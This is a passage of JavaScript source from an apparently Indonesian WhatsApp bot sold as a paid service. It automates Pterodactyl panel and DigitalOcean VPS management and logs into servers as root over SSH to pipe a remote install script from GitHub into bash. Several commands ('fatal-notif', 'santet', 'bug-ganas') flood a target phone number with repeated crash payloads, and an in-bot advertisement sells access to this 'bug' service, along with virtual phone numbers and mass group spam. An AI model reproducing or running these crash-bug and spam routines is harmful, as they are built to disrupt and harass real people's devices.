        if (data.toString().includes('Input')) {
            stream.write('admin@gmail.com\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('admin@gmail.com\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('admin\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('adm\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('adm\n');
        }
        if (data.toString().includes('Input')) {
            stream.write(`${password}\n`);
        }
        if (data.toString().includes('Input')) {
            stream.write(`${subdomain}\n`);
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('yes\n');
        }
        if (data.toString().includes('Please read the Terms of Service')) {
            stream.write('A\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('1\n');
        }
        console.log('STDOUT: ' + data);
    }

    function handleWingsInstallationInput(data, stream, domainnode, subdomain) {
        if (data.toString().includes('Input')) {
            stream.write('1\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write(`${subdomain}\n`);
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('user\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('1248\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write(`${domainnode}\n`);
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('admin@gmail.com\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        console.log('STDOUT: ' + data);
    }

    function handleNodeCreationInput(data, stream, domainnode, ramvps) {
        stream.write('TamzDev\n');
        stream.write('4\n');
        stream.write('SGP\n');
        stream.write('AutoCnode TamzDev\n');
        stream.write(`${domainnode}\n`);
        stream.write('NODES\n');
        stream.write(`${ramvps}\n`);
        stream.write(`${ramvps}\n`);
        stream.write('1\n');
        console.log('STDOUT: ' + data);
    }
}

break
case "jpmslide": case "startjpmslide": {
if (!isOwner) return m.reply(msg.owner)
let total = 0
let getGroups = await tamzz.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let usergc = groups.map((v) => v.id)
let time = ms(delayjpm * Number(usergc.length))
let imgsc = await prepareWAMessageMedia({ image: await fs.readFileSync("./thumb.png") }, { upload: tamzz.waUploadToServer })
const msgii = await generateWAMessageFromContent(m.chat, {
viewOnceMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: "*All Transaksi Open ✅*\n\n*TamzDev* Menyediakan Produk & Jasa Dibawah Ini ⬇️"
}),
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: [{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `*� PANEL UNLI 1GB-UNLI*
*� RESELLER PANEL (7K/PERMA)*
*� ADMIN PANEL (10K/PERMA)*
*� PT PANEL (15K/PERMA)*
*� OWN PANEL (20K/PERMA)*
*� OPEN MURBUG (5K/PERMA)*
*� OPEN MURNOKOS (8K)*
*� OPEN MURLOG (5K)*
*� OPEN BOTPUSH (5K/PERMA)*
*� OPEN BOT JAGA GC ANTILINK (5K/PERMA)*
*� OPEN MURSUN (5K)*
*� NOKOS INDO (7K)*
*� NOKOS VIETNAM (6K)*
*� SC BUG TEMBUS ALLWA (10K)*
*� DLL TANYAKAN OWNER/ADMIN*`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson:  `{\"display_text\":\"Beli Produk\",\"url\":\"https://wa.me/6285727035336\",\"merchant_url\":\"https://wa.me/6285727035336\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `*OPEN NOKOS*
_-NOKOS INDO  (7K)_
_-NOKOS VIET  (6K)_
_-NOKOS CANADA  (6K)_
_-NOKOS MALAYSIA  (10K)_
_-DLL TANYAKN ADMIN_

*OPEN MURNOKOS 8K*
KEUNTUNGAN?
> BISA DIJUAL KENBALI MURNOKOS
> NOKOS MURMER
> JDI KANG NOKOS
> NOKOS ANTI RAWAN KENON`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson:  `{\"display_text\":\"Beli Produk\",\"url\":\"https://wa.me/6285555555555\",\"merchant_url\":\"https://wa.me/6285555555555\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `*OPEN MURBUG BY TAMZDEV*
PRICE LIST:
5K/BULAN
10K/PERMA (SMPE PANEL MOKAD)

FUNGSI?
_-BUAT CRASH/BUG NO RIPER_

KEUNTUNGAN?*
_-HARGA LEBIH MURAH DRI STORE YG LAIN_
_-TEMBUS ALL WA_
_-MENDAPATKAN GARANSI JIKA BUG TIDAK TEMBUS_`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson:  `{\"display_text\":\"Beli Produk\",\"url\":\"https://wa.me/6285555555555\",\"merchant_url\":\"https://wa.me/6285555555555\"}`
}]
})
}]
})
})}
}}, {userJid: m.sender, quoted: qchanel})
await m.reply(`Memproses Mengirim Pesan Slide Teks & Foto Ke *${usergc.length} Grup*

*Waktu Selsai :*
${time.minutes} menit, ${time.seconds} detik`)
for (let jid of usergc) {
try {
await tamzz.relayMessage(jid, msgii.message, {messageId: msgii.key.id})
total += 1
} catch {}
await sleep(global.delayjpm)
}
await m.reply(`Berhasil Mengirim Pesan Slide Teks & Foto Ke *${total} Grup*`)
}
break
case 'turnon': {
if (!isOwner) return ("apalah 😏")
let dropletId = args[0];
if (!dropletId) return reply('ID droplet belum diberikan!');
async function turnOnDroplet() {
try {
const response = await axios.post(
`https://api.digitalocean.com/v2/droplets/${dropletId}/actions`,
{
type: 'power_on',
},
{
headers: {
'Content-Type': 'application/json',
Authorization: `Bearer ${apido}`,
},
}
);

if (response.status === 201 && response.data.action && response.data.action.status === 'in-progress') {
reply('VPS (droplet) sedang dihidupkan...');
} else {
reply('Gagal menghidupkan VPS (droplet).');
}
} catch (err) {
reply('Terjadi kesalahan saat menghidupkan VPS (droplet):', err);
}
}
turnOnDroplet();
break;
}

case 'turnoff': {
if (!isOwner) return ("apalah 😏")
let dropletId = args[0];
if (!dropletId) return reply('ID droplet belum diberikan!');

async function turnOffDroplet() {
try {
const response = await axios.post(
`https://api.digitalocean.com/v2/droplets/${dropletId}/actions`,
{
type: 'power_off',
},
{
headers: {
'Content-Type': 'application/json',
Authorization: `Bearer ${apido}`,
},
}
);

if (response.status === 201 && response.data.action && response.data.action.status === 'in-progress') {
reply('VPS (droplet) sedang dimatikan...');
} else {
reply('Gagal mematikan VPS (droplet).');
}
} catch (err) {
reply('Terjadi kesalahan saat mematikan VPS (droplet):', err);
}}
turnOffDroplet();
break;
}

case 'restartvps': {
if (!isOwner) return ("apalah 😏")
let dropletId = args[0];
if (!dropletId) return reply('ID droplet belum diberikan!');
const restartVPS = async (dropletId) => {
try {
const apiUrl = `https://api.digitalocean.com/v2/droplets/${dropletId}/actions`;

const response = await fetch(apiUrl, {
method: 'POST',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${apido}`
},
body: JSON.stringify({
type: 'reboot'
})
});

if (response.ok) {
const data = await response.json();
return data.action;
} else {
const errorData = await response.json();
reply(`Gagal melakukan restart VPS: ${errorData.message}`);
}
} catch (err) {
reply('Terjadi kesalahan saat melakukan restart VPS:', err);
}
};

restartVPS(dropletId)
.then((action) => {
reply(`Aksi restart VPS berhasil dimulai. Status aksi: ${action.status}`);
})
.catch((err) => {
reply(err);
})
}
break;

case 'rebuild': {
if (!isOwner) return ("apalah 😏")
let dropletId = args[0];
if (!dropletId) return reply('ID droplet belum diberikan!');
let rebuildVPS = async () => {
try {
// Rebuild droplet menggunakan API DigitalOcean
const response = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}/actions`, {
method: 'POST',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${apido}`
},
body: JSON.stringify({
type: 'rebuild',
image: 'ubuntu-20-04-x64' // Ganti dengan slug image yang ingin digunakan untuk rebuild (misal: 'ubuntu-18-04-x64')
})
});

if (response.ok) {
const data = await response.json();
reply('Rebuild VPS berhasil dimulai. Status aksi:', data.action.status);
const vpsInfo = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
method: 'GET',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${apido}`
}
});
if (vpsInfo.ok) {
const vpsData = await vpsInfo.json();
const droplet = vpsData.droplet;
const ipv4Addresses = droplet.networks.v4.filter(network => network.type === 'public');
const ipAddress = ipv4Addresses.length > 0 ? ipv4Addresses[0].ip_address : 'Tidak ada IP!';

const textvps = `*VPS BERHASIL DI REBUILD*
IP VPS: ${ipAddress}
SYSTEM IMAGE: ${droplet.image.slug}`;
await sleep(60000) 
tamzz.sendMessage(m.chat, { text: textvps });
} else {
reply('Gagal mendapatkan informasi VPS setelah rebuild!');
}
} else {
const errorData = await response.json();
reply('Gagal melakukan rebuild VPS:', errorData.message);
}
} catch (err) {
reply('Terjadi kesalahan saat melakukan rebuild VPS:', err);
}};
rebuildVPS();
}
break;

case 'sendvps': {
if (!isOwner) return ("apalah 😏")
if (!text) return m.reply(`Contoh: ${prefix+command} 628xxx,ip,ram,harga,password`)
edit3("Mengirim pesanan...", "Proses hampir selesai", "Sukses mengirim pesanan!") 
var mon = args.join(' ')
var m1 = mon.split(",")[0]
var m2 = mon.split(",")[1]
var m3 = mon.split(",")[2]
var m4 = mon.split(",")[3]
var m5 = mon.split(",")[4]
let mq1 = m1 + '@s.whatsapp.net'
let ownernya = owner + '@s.whatsapp.net'
let me = m.sender
let ments = [mq1, ownernya, me]
tamzz.sendMessage(mq1, {text: `*°•——————  ${storename}  ——————•°*

*📦 PESANAN MU DATANG 📦*
Harga: ${m4}
Username: Root
Password: ${m5}
Ram: ${m3}

*°•——————  TOS VPS  ——————•°*

- Jgn sampai kena ddos
- Cpu jgn sampai 120%+
- Panel sus no reff
Melanggar? garansi angus! `}, m) 
}
break
case "addusr": {
if (!isOwner) return m.reply(mess.only.owner)
let t = text.split(',');
if (t.length < 3) return m.reply(`*Format salah!*

Penggunaan:
${prefix + command} email,username,name,number/tag`);
let email = t[0];
let username = t[1];
let name = t[2];
let u = m.quoted ? m.quoted.sender : t[3] ? t[3].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
if (!u) return m.reply(`*Format salah!*

Penggunaan:
${prefix + command} email,username,name,number/tag`);
let d = (await tamzz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": name,
"last_name": "Memb",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let p = await tamzz.sendMessage(m.chat, { text: `
• *SUCCESSFULLY ADD USER*

• TYPE : User

• ID : ${user.id}
• UUID : ${user.uuid}
• USERNAME : ${user.username}
• EMAIL : ${user.email}
• NAME : ${user.first_name} ${user.last_name}
• LANGUAGE : ${user.language}
• ADMIN : ${user.root_admin}
• ️CREATED AT : ${user.created_at}

*Password Telah Dikirim Di Private Chat @${u.split`@`[0]}*`, mentions:[u],
})
tamzz.sendMessage(u, { text: `Hai Onii Chan ${pushname} 

• ID : ${user.id}
• EMAIL : ${user.email}
• USERNAME : ${user.username}
• PASSWORD : ${password.toString()}
• LOGIN : ${domain}

*NOTE :*
- MOHON DI SIMPAN ,KARENA BOT TAMZZ - CPANEL BIKIN PANEL HANYA 1× JADI JIKA HILANG JANGAN SALAHKAN BOT TAMZZ - CPANEL`,
})
}
break
case 'th1': {
    if (!isOwner) return ("apalah 😏")
    
    let t = text.split(',');
    if (t.length < 2) return reply(`*Format salah!*\nPenggunaan: ${prefix}installtheme ipvps,password`)
    
    let ipvps = t[0];
    let passwd = t[1];
    
    const connSettings = {
        host: ipvps,
        port: '22',
        username: 'root',
        password: passwd
    };

    // Fungsi untuk mendekode representasi byte kembali ke string asli
    function tamzz(opece) {
        return opece.split('\\x').slice(1).map(byte => String.fromCharCode(parseInt(byte, 16))).join('');
    }

    // Gunakan string terenkripsi di kode Anda
    const command = 'bash <(curl https://raw.githubusercontent.com/gitfdil1248/thema/main/install.sh)'

    const conn = new Client();
    let isSuccess = false; // Flag untuk menentukan keberhasilan koneksi

    conn.on('ready', () => {
        isSuccess = true; // Set flag menjadi true jika koneksi berhasil
        reply('*PROSES INSTALL THEME DIMULAI MOHON TUNGGU 5-10 MENIT KEDEPAN*');
        
        conn.exec(command, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Stream closed with code ' + code + ' and signal ' + signal);
                reply('`SUKSES INSTALL THEME PANEL ANDA, SILAHKAN CEK`')
                conn.end();
            }).on('data', (data) => {
                stream.write('kenapasepuh\n');
                stream.write('1\n');
                stream.write('1\n');
                stream.write('y\n');
                stream.write('x\n');
                
                console.log('STDOUT: ' + data);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }).on('error', (err) => {
        console.log('Connection Error: ' + err);
        reply('Katasandi atau IP tidak valid');
    }).connect(connSettings);
   
   setTimeout(() => {
        if (isSuccess) {
            reply('DONE GA BANG??');
        }
    }, 300000); // 180000 ms = 3 menit
   
}
break  
case 'th2': {
    if (!isOwner) return ("apalah 😏")
    
    let t = text.split(',');
    if (t.length < 2) return reply(`*Format salah!*\nPenggunaan: ${prefix}installtheme ipvps,password`)
    
    let ipvps = t[0];
    let passwd = t[1];
    
    const connSettings = {
        host: ipvps,
        port: '22',
        username: 'root',
        password: passwd
    };

    // Fungsi untuk mendekode representasi byte kembali ke string asli
    function tamzz(opece) {
        return opece.split('\\x').slice(1).map(byte => String.fromCharCode(parseInt(byte, 16))).join('');
    }

    // Gunakan string terenkripsi di kode Anda
    const command = 'bash <(curl https://raw.githubusercontent.com/gitfdil1248/thema/main/install.sh)'

    const conn = new Client();
    let isSuccess = false; // Flag untuk menentukan keberhasilan koneksi

    conn.on('ready', () => {
        isSuccess = true; // Set flag menjadi true jika koneksi berhasil
        reply('*PROSES INSTALL THEME DIMULAI MOHON TUNGGU 5-10 MENIT KEDEPAN*');
        
        conn.exec(command, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Stream closed with code ' + code + ' and signal ' + signal);
                reply('`SUKSES INSTALL THEME PANEL ANDA, SILAHKAN CEK`')
                conn.end();
            }).on('data', (data) => {
                stream.write('kenapasepuh\n');
                stream.write('1\n');
                stream.write('2\n');
                stream.write('yes\n');
                stream.write('x\n');
                
                console.log('STDOUT: ' + data);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }).on('error', (err) => {
        console.log('Connection Error: ' + err);
        reply('Katasandi atau IP tidak valid');
    }).connect(connSettings);
   
   setTimeout(() => {
        if (isSuccess) {
            reply('DONE GA BANG??');
        }
    }, 300000); // 180000 ms = 3 menit
   
}
break  
case 'th3': {
    if (!isOwner) return ("apalah 😏")
    
    let t = text.split(',');
    if (t.length < 2) return reply(`*Format salah!*\nPenggunaan: ${prefix}installtheme ipvps,password`)
    
    let ipvps = t[0];
    let passwd = t[1];
    
    const connSettings = {
        host: ipvps,
        port: '22',
        username: 'root',
        password: passwd
    };

    // Fungsi untuk mendekode representasi byte kembali ke string asli
    function tamzz(opece) {
        return opece.split('\\x').slice(1).map(byte => String.fromCharCode(parseInt(byte, 16))).join('');
    }

    // Gunakan string terenkripsi di kode Anda
    const command = 'bash <(curl https://raw.githubusercontent.com/gitfdil1248/thema/main/install.sh)'

    const conn = new Client();
    let isSuccess = false; // Flag untuk menentukan keberhasilan koneksi

    conn.on('ready', () => {
        isSuccess = true; // Set flag menjadi true jika koneksi berhasil
        reply('*PROSES INSTALL THEME DIMULAI MOHON TUNGGU 5-10 MENIT KEDEPAN*');
        
        conn.exec(command, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Stream closed with code ' + code + ' and signal ' + signal);
                reply('`SUKSES INSTALL THEME PANEL ANDA, SILAHKAN CEK`')
                conn.end();
            }).on('data', (data) => {
                stream.write('kenapasepuh;\n');
                stream.write('1\n');
                stream.write('3\n');
                stream.write('\n');
                stream.write('https://whatsapp.com/channel/0029VafTH7wKWEKz4UYjE618\n');
                stream.write('https://whatsapp.com/channel/0029VafTH7wKWEKz4UYjE618\n');
                stream.write('yes\n');
                stream.write('x\n');
                
                console.log('STDOUT: ' + data);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }).on('error', (err) => {
        console.log('Connection Error: ' + err);
        reply('Katasandi atau IP tidak valid');
    }).connect(connSettings);
   
   setTimeout(() => {
        if (isSuccess) {
            reply('DONE GA BANG??');
        }
    }, 300000); // 180000 ms = 3 menit
    
}
break
case 'installthema': {
if (!isOwner) return ("apalah 😏")
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} ipVps,password`)
let ipvps = t[0];
let passwd = t[1];

let sections = [{
title: 'Silahkan Pilih Theme Yang Ingin Di install',
rows: [{
title: 'INSTALL THEME STELLAR',
id: `.th1 ${ipvps},${passwd}`
},
{
title: 'INSTALL THEME BILLING', 
id: `.th2 ${ipvps},${passwd}`
},
{
title: 'INSTALL THEME ENIGMA',
id: `.th3 ${ipvps},${passwd}`
}]
}]

let listMessage = {
    title: 'Klik Disini!', 
    sections
};

let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterJid: '120363301428946392@newsletter',
 newsletterName: 'Powered By MikkuBot', 
 serverMessageId: -1
},
 businessMessageForwardInfo: { businessOwnerJid: tamzz.decodeJid(tamzz.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: Styles(`Silahkan Pilih Theme Yang Ingin Anda Install`)
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: `YT: fadzvpn`
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: `*Hi @${m.sender.split("@")[0]} 👋*`,
 subtitle: "dcdXdino",
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/52d4bb98002c0c963853e.jpg" } }, { upload: tamzz.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ 
 {
 "name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage)
 },
 ]
 })
 })
 }
 }
}, {})

await tamzz.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}
break
case 'createnode': {
    if (!isOwner) return reply(mess.only.owner);
    
    let t = text.split(',');
    if (t.length < 2) return reply(`*Format salah!*\nPenggunaan: ${prefix}createnode ipvps,password,domainnode,ramvps`)
    
    let ipvps = t[0];
    let passwd = t[1];
    let domainnode = t[2];
    let ramvps = t[3];
    const connSettings = {
        host: ipvps,
        port: '22',
        username: 'root',
        password: passwd
    };

    // Gunakan string terenkripsi di kode Anda
    const command = 'bash <(curl https://raw.githubusercontent.com/gitfdil1248/thema/main/install.sh)'
    const conn = new Client();
 
    conn.on('ready', () => {
        isSuccess = true; // Set flag menjadi true jika koneksi berhasil
        reply('*MEMULAI CREATE NODE & LOCATION*');
        
        conn.exec(command, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Stream closed with code ' + code + ' and signal ' + signal);
                reply('*NODE DAN LOCATION TELAH DI TAMBAHKAN SILAHAKAN TAMBAH KAN ALLOCATION MANUAL😂 & AMBIL TOKEN CONFIGURE*')
                conn.end();
            }).on('data', (data) => {
            stream.write('kenapasepuh\n');
            stream.write('4\n');
                stream.write('SGP\n');
                stream.write('AutoCnode TamzDev\n');
                stream.write(`${domainnode}\n`)
                stream.write('NODES\n');
                stream.write(`${ramvps}\n`);
                stream.write(`${ramvps}\n`);
                stream.write('1\n');
                console.log('STDOUT: ' + data);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }).on('error', (err) => {
        console.log('Connection Error: ' + err);
        reply('Katasandi atau IP tidak valid');
    }).connect(connSettings);
   }
break  
case 'myip': {
if (!isOwner) return reply('kusus owner')
var http = require('http')
http.get({
'host': 'api.ipify.org',
'port': 80,
'path': '/'
}, function(resp) {
resp.on('data', function(ip) {
reply("🔎 My public IP address is: " + ip);
})
})
}
break
case  'lacakip': {
if (!text) return reply(`*Example:* ${prefix + command} 165.282.18.191`)
 try {
reply(mess.wait)
 let res = await fetch(`https://ipwho.is/${text}`).then(result => result.json());
 await tamzz.sendMessage(from, { location: { degreesLatitude: res.latitude, degreesLongitude: res.longitude }},{ ephemeralExpiration: 604800 });
 } catch (e) { 
 return { error: `IP ${text} not found!` };
 }
}
break
case 'fatal-notif': case 'fatal-ui': case 'crash-total': case 'forces-sql': case 'tamzsystem': case 'systemc1-v2': {
if (!isOwner && !isMurbug) return m.reply('Maaf Perintah Ini Khusus Pengguna Murbug Kami! Join Murbug Dulu Baru Bisa Akses😈')
if (!isGroup) return m.reply('Gunakan Bug Didalam Group Murbug Owner Kami!')
if (!text) return m.reply(`Penggunaan .${command} 6287392784527`)
let bijipler = text.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return m.reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await m.reply('_Tunggu Sebentar Sedang Mengirim..._')
for (let j = 0; j < 30; j++) {
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
}
await m.reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
case 'santet': case 'bug-24j': case 'autoc1': case 'matilu': case 'santet-24j': case 'bug-ganas': {
if (!isOwner && !isMurbug) return m.reply('Maaf Perintah Ini Khusus Pengguna Murbug Kami! Join Murbug Dulu Baru Bisa Akses😈')
if (!isGroup) return m.reply('Gunakan Bug Didalam Group Murbug Owner Kami!')
if (!text) return m.reply(`Penggunaan .${command} 6287392784527`)
let bijipler = text.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return m.reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await m.reply('_Tunggu Sebentar Sedang Mengirim..._')
for (let j = 0; j < 30; j++) {
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
}
await m.reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
case 'bang': case 'halo': case 'assalamualaikum': case 'oyy': case 'test': case 'p': case 'rawr': {
if (!isOwner) return m.reply(`khusus bot doang`)
await m.reply(`Oy`)
await m.reply(`P`)
await m.reply(`Bang`)
await bakdok(m.chat, force)
await ngeloc(m.chat, force)
await bakdok(m.chat, force)
await ngeloc(m.chat, force)
await bakdok(m.chat)
await ngeloc(m.chat, force)
await bakdok(m.chat, force)
await ngeloc(m.chat, force)
await bakdok(m.chat, force)
await ngeloc(m.chat, force)
await bakdok(m.chat)
await ngeloc(m.chat, force)
tamzz.sendMessage(m.chat, {text: `adp brp?`}, {quoted:m})
await bakdok(m.chat, force)
await ngeloc(m.chat, force)
await bakdok(m.chat, force)
await ngeloc(m.chat, force)
await bakdok(m.chat)
await ngeloc(m.chat, force)
await m.reply(`malah off`)
}
break
case "addsrv": {
if (!isOwner) return m.reply(mess.owner)
let s = text.split(',');
if (s.length < 7) return m.reply(`*Format salah!*

Penggunaan:
${prefix + command} name,tanggal,userId,eggId,locationId,memory/disk,cpu`)
let name = s[0];
let desc = s[1] || ''
let usr_id = s[2];
let egg = s[3];
let loc = s[4];
let memo_disk = s[5].split`/`;
let cpu = s[6];

let f1 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data = await f1.json();
let startup_cmd = data.attributes.startup

let f = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo_disk[0],
"swap": 0,
"disk": memo_disk[0],
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
m.reply(`
- *SUCCESSFULLY ADD SERVER*

- TYPE: ${res.object}

- ID : ${server.id}
- UUID : ${server.uuid}
- NAME : ${server.name}
- DESCRIPTION : ${server.description}
- MEMORY : ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
- DISK : ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
- CPU : ${server.limits.cpu}%
- CREATED AT : ${server.created_at}`)
}
break
case "check-host": {
if (!text) return reply (`Example : ${prefix + command} https://nxnn.com`)
let msg = { viewOnceMessage: {
message: {
 "interactiveMessage": {
 "header": {
 "title": "",
 "subtitle": "p"
 },
 "body": {
 "text": "Click Button Di Bawah Untuk Check-Host ⬇️"
 },
 "footer": {
 "text": "YT: fadzvpn"
 },
 "nativeFlowMessage": {
 "buttons": [
 {
 "name": "cta_url",
 "buttonParamsJson": `{ display_text : 'Check Host' , url : "https://check-host.net/check-http?host=${q}", merchant_url : "https://check-host.net/check-http?host=${q}" }`
 }
 ],
 "messageParamsJson": ""
 }
 }
}
}
}
tamzz.relayMessage(m.chat, msg, {});
}
break
case "addusr2": {
if (!isOwner) return m.reply(mess.only.owner)
let t = text.split(',');
if (t.length < 3) return m.reply(`*Format salah!*

Penggunaan:
${prefix + command} email,username,name,number/tag`);
let email = t[0];
let username = t[1];
let name = t[2];
let u = m.quoted ? m.quoted.sender : t[3] ? t[3].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
if (!u) return m.reply(`*Format salah!*

Penggunaan:
${prefix + command} email,username,name,number/tag`);
let d = (await tamzz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": name,
"last_name": "Memb",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let p = await tamzz.sendMessage(m.chat, { text: `
• *SUCCESSFULLY ADD USER*

• TYPE : User

• ID : ${user.id}
